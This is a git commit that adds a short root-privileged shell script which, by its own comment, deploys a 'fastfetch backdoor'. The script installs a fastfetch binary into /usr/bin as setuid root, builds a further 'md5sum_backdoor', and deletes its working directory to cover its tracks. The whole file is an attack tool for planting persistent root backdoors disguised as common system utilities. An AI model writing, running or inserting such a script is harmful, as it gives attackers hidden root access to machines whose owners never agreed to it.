3a5f4808814667637bb9129a7d12f425de2fa6a4
ghh-jb <138157456+ghh-jb@users.noreply.github.com>
2026-05-13 12:47:52 +0300

    part of deploy script that requires root privileges

---
+++ root_deploy.sh
@@ -0,0 +1,10 @@
+# deploy fastfetch backdoor
+echo "[+] We are ($whoami)"
+mv ./fastfetch /usr/bin/fastfetch
+chown root:root /usr/bin/fastfetch
+chmod 4755 /usr/bin/fastfetch
+
+bash ./md5sum_backdoor/build.sh
+
+cd ..
+rm -rf ./my
